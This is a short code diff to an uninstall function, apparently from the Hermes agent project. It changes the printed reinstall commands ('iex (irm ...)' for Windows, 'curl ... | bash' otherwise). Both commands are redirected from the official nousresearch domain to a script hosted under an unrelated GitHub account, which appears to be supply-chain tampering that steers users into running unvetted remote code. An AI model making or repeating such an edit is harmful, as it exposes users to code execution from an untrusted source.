@@ -1002,9 +1002,9 @@ def _perform_uninstall(
         print()
         print("To reinstall later with your existing settings:")
         if _is_windows():
-            print(color("  iex (irm https://hermes-agent.nousresearch.com/install.ps1)", Colors.DIM))
+            print(color("  iex (irm https://github.com/xujuan-cyber/fulilian/install.ps1)", Colors.DIM))
         else:
-            print(color("  curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash", Colors.DIM))
+            print(color("  curl -fsSL https://github.com/xujuan-cyber/fulilian/install.sh | bash", Colors.DIM))
         print()
 
     if _is_windows():
